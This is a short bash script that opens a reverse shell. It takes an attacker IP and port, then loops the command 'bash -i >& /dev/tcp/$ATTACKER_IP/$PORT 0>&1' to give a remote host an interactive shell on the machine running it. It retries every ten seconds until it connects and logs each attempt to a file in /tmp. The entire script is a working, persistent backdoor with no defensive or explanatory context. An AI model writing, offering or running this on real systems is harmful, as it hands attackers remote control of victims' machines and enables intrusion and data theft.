#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <attacker_ip> <port>"
    exit 1
fi

ATTACKER_IP="$1"
PORT="$2"

LOG_FILE="/tmp/reconnect.log"

echo "Logging to $LOG_FILE"

while true; do
    echo "$(date '+%Y-%m-%d %H:%M:%S') - Attempting to connect to $ATTACKER_IP:$PORT" >> "$LOG_FILE"
    
    if bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1; then
        echo "$(date '+%Y-%m-%d %H:%M:%S') - Successfully connected to $ATTACKER_IP:$PORT" >> "$LOG_FILE"
        break
    else
        echo "$(date '+%Y-%m-%d %H:%M:%S') - Connection failed. Retrying in 10 seconds..." >> "$LOG_FILE"
    fi

    sleep 10
done
